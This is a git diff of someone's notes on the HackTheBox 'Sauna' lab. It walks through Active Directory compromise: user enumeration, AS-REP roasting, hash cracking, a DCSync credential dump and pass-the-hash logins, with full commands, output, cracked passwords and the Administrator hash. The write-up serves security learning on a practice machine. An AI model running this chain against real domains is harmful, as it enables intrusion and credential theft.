@@ -2,7 +2,7 @@
 - Add domain names to /etc/hosts (didn't state in notes but important)
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.10.175
 nmap -sU --top-ports=10 -vv 10.10.10.175
 
@@ -67,7 +67,7 @@ PORT     STATE         SERVICE      REASON
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+		```
 gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -80,7 +80,7 @@ gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuste
 /CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.175/CSS/]
 ```
 		- with html tag
-			```bash
+			```
 gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root -x html
 
 ---OUTPUT---
@@ -104,15 +104,15 @@ gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuste
 /CONTACT.html         (Status: 200) [Size: 15634]
 ```
 	- VHost
-		```bash
+		```
 
 ```
 - Ffuf
-	```bash
+	```
 
 ```
 - Dirsearch
-	```bash
+	```
 
 ```
 - Dirbuster
@@ -129,7 +129,7 @@ gobuster dir -u http://10.10.10.175 dns --wordlist /usr/share/wordlists/dirbuste
 --------------
 ## Initial Foothold in Website
 - We copy the usernames from the website into a username file:
-	```bash
+	```
 vi users # Copy here
 cat users
 
@@ -160,7 +160,7 @@ B.Taylor
 S.Driver
 ```
 - We brute force using kerbrute to find valid
-	```bash
+	```
 ./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /home/kali/Downloads/Windows/ActiveDirectory/Sauna/users
 
 ---OUTPUT---
@@ -184,7 +184,7 @@ $krb5asrep$18$FSmith@EGOTISTICAL-BANK.LOCAL:fa14af4be4b52eacf3b18373c0e078a1$029
 	- We try to crack this hash but fails
 		- This happened in one of our earlier labs too
 - We look for users with no kerberos pre-auth token (specifically fsmith's) (ASREPRoast)
-	```bash
+	```
 impacket-GetNPUsers -usersfile users -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175 'egotistical-bank.local/'
 
 ---OUTPUT---
@@ -200,7 +200,7 @@ $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:3ea6ec143b0f76fbe0a8367f03d25d91$f21
 ...
 ```
 	- We attempt to crack this hash with john:
-		```bash
+		```
 john fsmith.hash2 --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
@@ -209,18 +209,18 @@ Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL)
 - We can now login with credentials for user flag
 ## BloodHound Enumeration
 - We then use these credentials to grab files from target to analyze with bloodhound:
-	```bash
+	```
 bloodhound-python --dns-tcp -ns 10.10.10.175 -d egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' -c all
 ```
 - We mark fsmith as owned
 - Shortest path to Domain Admins
-	- ![[Pasted image 20250421092142.png]]
+	- ![Pasted image 20250421092142.png](../Attachments/Pasted%20image%2020250421092142.png)
 		- We mark svc_loanmgr as high value target (and administrator)
 
 ------------
 ## Privilege Escalation in Website
 - We find winPEASany.exe in Desktop and execute it and find something interesting:
-	```bash
+	```
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  EGOTISTICALBANK
@@ -229,7 +229,7 @@ bloodhound-python --dns-tcp -ns 10.10.10.175 -d egotistical-bank.local -u 'fsmit
 ```
 - We check using crackmapexec if the credentials work but it fails. 
 	- From BloodHound we know a high value target called `svc_loanmgr` and we use that with our credentials to check:
-		```bash
+		```
 crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
 
 ---OUTPUT---
@@ -242,18 +242,18 @@ WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\s
 		- We get a hit.
 - We mark `svc_loanmgr` as owned in BloodHound
 - Shortest Path from Owned Principles to Domain Admin
-	- ![[Pasted image 20250421093953.png]]
+	- ![Pasted image 20250421093953.png](../Attachments/Pasted%20image%2020250421093953.png)
 		- We see `svc_loanmgr` has DCSync privileges over our domain
 			- We can use this to grab the Administrator hash and perform Pass the Hash attack
 - Outbound Object Control > First Degree Object Control:
-	- ![[Pasted image 20250421094302.png]]
+	- ![Pasted image 20250421094302.png](../Attachments/Pasted%20image%2020250421094302.png)
 		- We see `svc_loanmgr` has multiple privileges over the domain:
 			- DCSync
 			- GetChanges
 			- GetChangesAll
 		- For DCSync to work we require the GetChanges and GetChangesAll privileges
 - We perform DCSync attack using secretsdump:
-	```bash
+	```
 impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'EGOTISTICAL-BANK.LOCAL'
 
 ---OUTPUT---
@@ -293,7 +293,7 @@ SAUNA$:des-cbc-md5:104c515b86739e08
 
 - Using the hash of Administrator we login to target:
 	- psexed:
-		```bash
+		```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175
 
 ---OUTPUT---
@@ -313,7 +313,7 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 	- winrm:
-		```bash
+		```
 evil-winrm -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175
 
 ---OUTPUT---
@@ -334,7 +334,7 @@ egotisticalbank\administrator
 - Mostly from Ippsec:
 ## Vim Magic Macros from userlist
 - Copy the users from website into file:
-	```bash
+	```
 vi magicusers
 cat magicusers
 
@@ -363,7 +363,7 @@ Sophie Driver
 - Then on the next name press `@a` to replicate what we did.
 	- We press it each time for each name
 - In the end the file should look like this:
-	```bash
+	```
 cat magicusers
 
 ---OUTPUT---
@@ -400,7 +400,7 @@ S.Driver
 		- Check password policy. If threshold is 0 there is no policy set and we are safe to brute force with passwords
 ### GetNPUsers
 - Can pas a simpler command to just check one user:
-	```bash
+	```
 impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith
 > (No pwd)
 
@@ -415,7 +415,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:66f9199898cc68c56c1366534ca67450$d53
 ```
 ### Cracking ASREP Hash with hashcat
 - Hashcat command:
-	```bash
+	```
 hashcat -m 18200 fsmith.hash2 /usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
@@ -430,7 +430,7 @@ $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:3ea6ec143b0f76fbe0a8367f03d25d91$f21
 		- Talks about files in ProgramData but those file don't exist for us
 ### Finding svc_loanmanager's real username
 - On our target once we have logged in with fsmith's credentials we can first try to check for `svc_loanmanager` like this:
-	```bash
+	```
 net user
 --OR--
 net users
@@ -444,7 +444,7 @@ HSmith                   krbtgt                   svc_loanmgr
 The command completed with one or more errors.
 ```
 	- For more information can do :
-		```bash
+		```
 net user /domain svc_loanmgr # can try other users
 
 ---OUTPUT---
